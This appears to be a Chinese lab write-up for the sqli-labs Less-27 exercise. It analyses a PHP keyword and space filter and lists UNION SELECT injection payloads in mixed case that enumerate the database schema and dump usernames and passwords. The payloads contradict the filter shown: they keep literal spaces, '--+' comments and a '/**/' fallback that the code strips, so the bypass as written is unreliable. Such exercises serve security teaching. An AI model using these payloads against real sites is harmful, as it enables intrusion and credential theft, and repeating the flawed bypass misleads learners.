# Less-27 UNION SELECT 过滤绕过（大小写混合）

## 源码分析

```php
// 过滤 union、select（只过滤全小写）
$id= preg_replace('/union/',"", $id);
$id= preg_replace('/select/',"", $id);
// 过滤空格
$id= preg_replace('/[\s]/',"", $id);
// 过滤注释
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
```

只过滤全小写 `union` 和 `select`，不拦截大小写混合。

## 绕过方案

**核心：大小写混合绕过**
`union` → `UnIon` / `UNION` / `uNiOn`

空格被过滤 → 用 `%09` `%0a` `%0b` `%0c` `%0d` `%a0` 或 tab 代替

## 完整 Payload

```sql
-- 判断列数
?id=1' order by 3--+

-- 确认 3 列
?id=-1' UnIon SeLect 1,2,3--+

-- 查数据库名
?id=-1' UnIon SeLect 1,database(),3--+

-- 查表
?id=-1' UnIon SeLect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- 查列
?id=-1' UnIon SeLect 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+

-- 脱裤
?id=-1' UnIon SeLect 1,group_concat(username,0x3a,password),3 from users--+
```

## 特殊情况处理

如果大小写也被拦截（少部分版本），用注释拆分：
```
?id=-1' un/**/ion sel/**/ect 1,database(),3--+
```
